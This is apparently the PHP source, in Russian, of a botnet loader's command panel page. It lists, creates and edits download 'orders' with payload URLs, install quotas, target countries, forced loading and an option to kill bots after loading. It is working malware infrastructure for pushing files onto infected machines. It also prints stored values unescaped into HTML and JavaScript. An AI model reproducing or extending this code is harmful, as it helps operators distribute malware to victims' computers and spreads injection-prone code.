<?php

if(!defined('GRANTED')) die;

echo '<script>
function delorder(id,name) {
	if (confirm("Точно хотите удалить задание: ["+ id +"] "+ name +" ?")) { document.location="?act=del&id="+ id +""}
}
</script>

<script>
function resorder(id,name) {
	if (confirm("Точно хотите сбросить статистику задания: ["+ id +"] "+ name +" ?")) { document.location="?act=res&id="+ id +""}
}
</script>
';

$id = intval($_GET['id']);
$temp = file_get_contents('../data/orders.dat');
$ORDERS = explode("\n", $temp);

if ($temp) {

	echo '<table align=center width=900 class=table style="background:#000000;margin-bottom:5px;" cellpadding=1 cellspacing=1>
<tr align=center>
	<td width=15px></td>
	<td class=table1 width=155px>[ID] Название / Дата</td>
	<td class=table1 width=100px>Нужно / Готово</td>
	<td class=table1>Файл / Инфо</td>
	<td class=table1>Страны для прогрузки</td>
</tr>
';

	while (current($ORDERS)) {
		$i++;
		$temp = unserialize(current($ORDERS));
		if ($id==$temp['id']) $ORDER=$temp;
		$temp['url'] = str_replace(';', '<br>', $temp['url']);
		$tmp = substr_count(file_get_contents('../data/'.$temp['id'].'i.dat'), "\n");
		$count += $tmp;
		echo '<tr align=center class=table style="font-weight:normal;"  onmouseover="this.className=\'string\';" onmouseout="this.className=\'table\';">
	<td class=table1>'.(($i==1)?('&nbsp;'):('<a href="?act=up&id='.$temp['id'].'">/\</a>')).'<br>-<br>'.(($i==count($ORDERS)-1)?('&nbsp;'):('<a href="?act=dn&id='.$temp['id'].'">\/</a>')).'</td>
	<td>['.$temp['id'].'] '.$temp['name'].'<br>'.date('d M y - H:i:s', $temp['time']).'<br>
	<a href="?page=orders&act=edt&id='.$temp['id'].'">редакт.</a>
	<a href="javascript:resorder('.$temp['id'].',\''.$temp['name'].'\')">сброс.</a>
	<a href="javascript:delorder('.$temp['id'].',\''.$temp['name'].'\')">удал.</a>
	<a href="?act=inv&id='.$temp['id'].'" style="color:'.(($temp['status']=='on')?('firebrick'):('green')).';">'.(($temp['status']=='on')?('стоп'):('старт')).'</a></td>
	<td>'.$temp['need'].'<br><a href="../service.php?o='.$temp['name'].'&t='.$temp['time'].'">'.substr_count(file_get_contents('../data/'.$temp['id'].'i.dat'), "\n").'</a></td>
	<td nowrap style="padding-left:5px;padding-right:5px;">'.$temp['url'].'</a>'.(($temp['force'])?('<font color=green>Форсированая прогрузка</font>'):('')).'<br>'.(($temp['kill'])?('<font color=firebrick>Убивать отработавших ботов</font>'):('Бан до след. загр.: <font color=green>'.$temp['ban'].'</font> ч.')).'</td>
	<td style="font-size:9px;">';
		if (substr_count($temp['countries'], ' ')==count($COUNTRY_CODE)+1) echo 'ВСЕ СТРАНЫ';
		else {
			$tmp = explode(' ', $temp['countries']);
			foreach ($tmp as $value) echo $COUNTRY_CODE[$value].' ';
		}
		echo '</td>
</tr>
';
		next($ORDERS);
	}

	echo '<tr align=center>
	<td></td>
	<td class=table1 colspan=2>Заданий: '.(count($ORDERS)-1).'</td>
	<td class=table1>Загрузок: '.$count.'</td>
	<td class=table1>&nbsp;</td>
</tr>
</table>';

}

$temp = explode(" ", $ORDER['countries']);
unset($temp[0]);
array_pop($temp);

echo '<table align=center width=900 class=table style="border:1px solid #425B6A;margin-bottom:5px;" cellpadding=1 cellspacing=1>
<tr align=center><td class=table1 colspan=3>'.(($_GET['act']=='edt')?('Редактирование задания: ['.$ORDER['id'].'] '.$ORDER['name']):('Создание нового задания')).'</td></tr>
<form method=post action="?page=orders&act='.(($_GET['act']=='edt')?('edt&id='.$id):('add')).'">
<tr align=center>
	<td width=300px rowspan=10>
		<select name="countries[]" size=12 multiple>
';
		for($i=0;$i<count($COUNTRY_NAME);$i++) { echo '<option value='.$i.((in_array($i, $temp))?(' selected'):('')).'>['.$COUNTRY_CODE[$i].'] '.$COUNTRY_NAME[$i]."\r\n"; }
		echo '		</select>
	</td>
</tr>
<tr>
	<td align=right>Количество загрузок:*</td>
	<td><input type=text class=text name="need" value="'.intval($ORDER['need']).'" maxlength=7 style="width:50px;text-align:center;"></td>
</tr>
<tr>
	<td width=130 align=right>Название задания:*</td>
	<td><input type=text class=text name="name" maxlength=16 value="'.$ORDER['name'].'" style="width:150px;"></td>
</tr>
<tr>
	<td align=right>URLs через ";":*</td>
	<td><input type=text class=text name="url" maxlength=1024 value="'.(($ORDER['url'])?($ORDER['url']):('http://')).'" style="width:450px;"></td>
</tr>
<tr>
	<td align=right>Запрещать выполнение</td>
	<td>ботом других заданий втечение <input type=text class=text name="ban" value="'.(($ORDER['ban'])?($ORDER['ban']):('24')).'" maxlength=4 style="width:30px;text-align:center;"> часов с момента выполнения этого</td>
</tr>
<tr>
	<td align=right><input type=checkbox class=text name="force"'.(($ORDER['force'])?(' checked'):('')).'>&nbsp;</td>
	<td>Грузить этот файл игнорируя временный запрет на загрузку</td>
</tr>
<tr>
	<td align=right><input type=checkbox class=text name="kill"'.(($ORDER['kill'])?(' checked'):('')).'>&nbsp;</td>
	<td>Убивать бота после этой загрузки</td>
</tr>
<tr><td colspan=2>&nbsp;</td></tr>
<tr><td colspan=2 align=center>&nbsp;'.((!$info and $_GET['a'])?('<font color=green>Задание успешно создано</font>'):((!$info and $_GET['e'])?('<font color=green>Задание успешно отредактировано</font>'):($info))).'</td></tr>
<tr><td colspan=2 align=center>'.(($_GET['act']=='edt')?('<input class=button name="cancel" type=submit value="Отмена" style="background:darkred;"> '):('')).'<input class=button name="pressed" type=submit value="'.(($_GET['act']=='edt')?('Отредактировать задание'):('Добавить задание')).'"></td></tr>
</form>
</table>';

?>